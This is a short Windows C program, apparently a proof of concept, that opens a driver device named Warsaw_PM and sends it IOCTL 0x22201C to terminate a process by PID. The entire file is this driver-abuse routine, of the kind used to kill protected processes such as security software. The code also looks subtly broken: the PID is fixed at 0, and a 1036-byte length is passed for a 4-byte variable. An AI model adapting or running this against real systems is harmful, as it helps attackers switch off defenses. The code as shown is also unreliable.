#include <Windows.h>
#include <stdio.h>
#include <stdint.h>

#define IOCTL 0x22201C


int main() {

    unsigned int pid = 0;

    HANDLE hHandle = CreateFile(L"\\\\.\\Warsaw_PM", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hHandle == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open handle. Error: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Successfully opened handle ...\n");

    // Prepare IOCTL buffer
    DWORD lpBytesReturned = 0;

    // Send the IOCTL request
    if (!DeviceIoControl(hHandle, IOCTL, &pid, 1036, NULL, 0, &lpBytesReturned, NULL)) {
        printf("[!] DeviceIoControl failed with error: %d\n", GetLastError());
    }
    else {
        printf("[+] Successfully sent IOCTL 0x22201C to terminate PID: %d\n", pid);
    }

    // Cleanup
    CloseHandle(hHandle);

    return 0;
}
